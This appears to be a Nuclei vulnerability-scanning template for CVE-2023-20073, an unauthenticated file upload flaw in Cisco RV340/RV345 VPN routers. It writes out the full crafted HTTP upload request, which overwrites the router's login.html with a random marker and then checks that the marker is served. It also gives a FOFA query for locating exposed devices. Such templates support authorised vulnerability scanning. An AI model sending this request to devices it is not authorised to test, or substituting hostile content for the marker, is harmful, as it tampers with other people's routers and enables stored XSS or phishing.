id: CVE-2023-20073

info:
  name: Cisco VPN Routers - Unauthenticated Arbitrary File Upload and Stored XSS
  author: princechaddha,ritikchaddha
  severity: critical
  description: |
    A vulnerability in the web-based management interface of Cisco RV340, RV340W, RV345, and RV345P Dual WAN Gigabit VPN Routers could allow an unauthenticated, remote attacker to upload arbitrary files to an affected device. This vulnerability is due to insufficient authorization enforcement mechanisms in the context of file uploads. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. A successful exploit could allow the attacker to upload arbitrary files to the affected device.
  reference:
    - https://unsafe.sh/go-173464.html
    - https://gist.github.com/win3zz/076742a4e365b1bba7e2ba0ebea9253f
    - https://github.com/RegularITCat/CVE-2023-20073/tree/main
    - https://nvd.nist.gov/vuln/detail/CVE-2023-20073
  metadata:
    verified: true
    fofa-query: app="CISCO-RV340" || app="CISCO-RV340W" || app="CISCO-RV345" || app="CISCO-RV345P"
  tags: cve,cve2023,xss,fileupload,cisco,unauth,routers,vpn,intrusive

http:
  - raw:
      - |
        POST /api/operations/ciscosb-file:form-file-upload HTTP/1.1
        Host: {{Hostname}}
        Authorization: 1
        Content-Type: multipart/form-data; boundary=------------------------f6f99e26f3a45adf

        --------------------------f6f99e26f3a45adf
        Content-Disposition: form-data; name="pathparam"

        Portal
        --------------------------f6f99e26f3a45adf
        Content-Disposition: form-data; name="fileparam"

        login.html
        --------------------------f6f99e26f3a45adf
        Content-Disposition: form-data; name="file.path"

        login.html
        --------------------------f6f99e26f3a45adf
        Content-Disposition: form-data; name="file"; filename="login.html"
        Content-Type: application/octet-stream

        {{randstr}}

        --------------------------f6f99e26f3a45adf--

      - |
        GET /login.html HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body_2
        words:
          - "{{randstr}}"
